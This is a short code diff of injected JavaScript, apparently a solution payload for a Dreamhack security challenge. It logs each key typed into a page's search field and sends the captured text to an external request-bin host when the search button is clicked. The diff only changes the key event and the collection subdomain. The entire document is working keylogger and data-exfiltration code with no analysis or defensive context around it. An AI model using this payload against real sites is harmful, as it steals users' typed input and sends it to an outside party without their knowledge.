@@ -3,12 +3,12 @@ const search_word = document.getElementsByName("search_word")[0];
 
 var search_keylog = "";
 
-search_word.addEventListener("keyup", (e) => {
+search_word.addEventListener("keypress", (e) => {
     search_keylog += e.key;
 });
 
 const search_btn = document.getElementsByTagName("button")[0];
 
 search_btn.addEventListener('click', () => {
-    fetch("https://jperuml.request.dreamhack.games?k=" + search_keylog);
+    fetch("https://hbeqqxv.request.dreamhack.games?k=" + search_keylog);
 })
